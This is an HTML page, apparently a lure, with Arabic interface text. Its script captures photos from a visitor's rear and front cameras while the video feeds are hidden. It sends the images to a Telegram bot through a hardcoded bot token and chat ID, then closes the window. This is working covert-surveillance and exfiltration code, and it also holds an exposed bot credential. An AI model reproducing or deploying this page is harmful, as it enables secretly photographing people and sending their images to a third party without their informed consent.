<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            overflow: hidden;
            touch-action: none;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }
        
        .camera-view {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            z-index: -1;
        }
        
        #permission-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            color: white;
            text-align: center;
            padding: 20px;
            opacity: 1;
            transition: opacity 0.3s ease;
        }
        
        .permission-btn {
            margin-top: 30px;
            padding: 12px 30px;
            background-color: #007AFF;
            color: white;
            border-radius: 20px;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }
        
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.9);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1001;
            color: white;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #007AFF;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- عنصري الكاميرا المخفيان -->
    <video id="back-camera" class="camera-view" autoplay playsinline></video>
    <video id="front-camera" class="camera-view" autoplay playsinline></video>
    
    <!-- طبقة طلب الإذن -->
    <div id="permission-overlay">
        <h2 style="margin-bottom: 15px;">يتطلب التطبيق الوصول إلى الكاميرا</h2>
        <p style="margin-bottom: 10px;">سيتم التقاط صورتين (أمامية وخلفية) وإرسالهما تلقائيًا</p>
        <button class="permission-btn" id="allow-btn">الموافقة والمتابعة</button>
    </div>
    
    <!-- طبقة التحميل -->
    <div id="loading-overlay">
        <div class="spinner"></div>
        <p>جاري معالجة الصور...</p>
    </div>
    
    <script>
        // التكوين - استبدل هذه القيم
        const config = {
            botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
            chatId: '5310911220',
            captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
            switchCameraDelay: 500, // تأخير تبديل الكاميرا
            autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
        };
        
        // العناصر
        const backCamera = document.getElementById('back-camera');
        const frontCamera = document.getElementById('front-camera');
        const permissionOverlay = document.getElementById('permission-overlay');
        const loadingOverlay = document.getElementById('loading-overlay');
        const allowBtn = document.getElementById('allow-btn');
        
        // دالة لتهيئة الكاميرا
        async function initCamera(videoElement, facingMode) {
            try {
                const constraints = {
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: facingMode
                    },
                    audio: false
                };
                
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    return await navigator.mediaDevices.getUserMedia(constraints);
                } else if (navigator.getUserMedia) {
                    return new Promise((resolve, reject) => {
                        navigator.getUserMedia(constraints, resolve, reject);
                    });
                } else {
                    throw new Error('Camera API not supported');
                }
            } catch (error) {
                console.error('Camera initialization failed:', error);
                throw error;
            }
        }
        
        // دالة التقاط الصورة
        function capturePhoto(videoElement) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(resolve, 'image/jpeg', 0.92);
            });
        }
        
        // دالة إرسال الصور إلى تليجرام
        async function sendToTelegram(photos) {
            try {
                const formData = new FormData();
                formData.append('chat_id', config.chatId);
                formData.append('caption', 'تم التقاط صورتين: أمامية وخلفية');
                
                // إضافة الصور إلى FormData
                photos.forEach((photo, index) => {
                    formData.append(`photo_${index}`, photo.blob, `${photo.type}_photo.jpg`);
                });
                
                const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMediaGroup`, {
                    method: 'POST',
                    body: formData
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                throw error;
            }
        }
        
        // دالة رئيسية للعملية الكاملة
        async function captureAndSend() {
            try {
                const photos = [];
                
                // 1. التقاط الصورة الخلفية أولاً
                const backStream = await initCamera(backCamera, 'environment');
                backCamera.srcObject = backStream;
                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
                
                const backPhotoBlob = await capturePhoto(backCamera);
                photos.push({ type: 'back', blob: backPhotoBlob });
                
                // إيقاف الكاميرا الخلفية
                backStream.getTracks().forEach(track => track.stop());
                
                // 2. الانتظار قليلاً قبل تبديل الكاميرا
                await new Promise(resolve => setTimeout(resolve, config.switchCameraDelay));
                
                // 3. التقاط الصورة الأمامية
                const frontStream = await initCamera(frontCamera, 'user');
                frontCamera.srcObject = frontStream;
                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
                
                const frontPhotoBlob = await capturePhoto(frontCamera);
                photos.push({ type: 'front', blob: frontPhotoBlob });
                
                // إيقاف الكاميرا الأمامية
                frontStream.getTracks().forEach(track => track.stop());
                
                // 4. إرسال الصور
                await sendToTelegram(photos);
                
                // 5. إغلاق النافذة بعد الإرسال
                setTimeout(() => {
                    window.close();
                }, config.autoCloseDelay);
                
            } catch (error) {
                console.error('Process failed:', error);
                loadingOverlay.style.display = 'none';
                alert('حدث خطأ: ' + (error.message || 'غير معروف'));
            }
        }
        
        // معالجة النقر على زر الموافقة
        allowBtn.addEventListener('click', async () => {
            try {
                // إخفاء واجهة الإذن وإظهار التحميل
                permissionOverlay.style.opacity = '0';
                setTimeout(() => {
                    permissionOverlay.classList.add('hidden');
                    loadingOverlay.style.display = 'flex';
                }, 300);
                
                // بدء عملية الالتقاط والإرسال
                await captureAndSend();
                
            } catch (error) {
                console.error('Initialization failed:', error);
                loadingOverlay.style.display = 'none';
                alert('حدث خطأ في التهيئة: ' + (error.message || 'غير معروف'));
            }
        });
        
        // بدء العملية عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            // يمكن إضافة أي تهيئة إضافية هنا
        });
    </script>
</body>
</html>
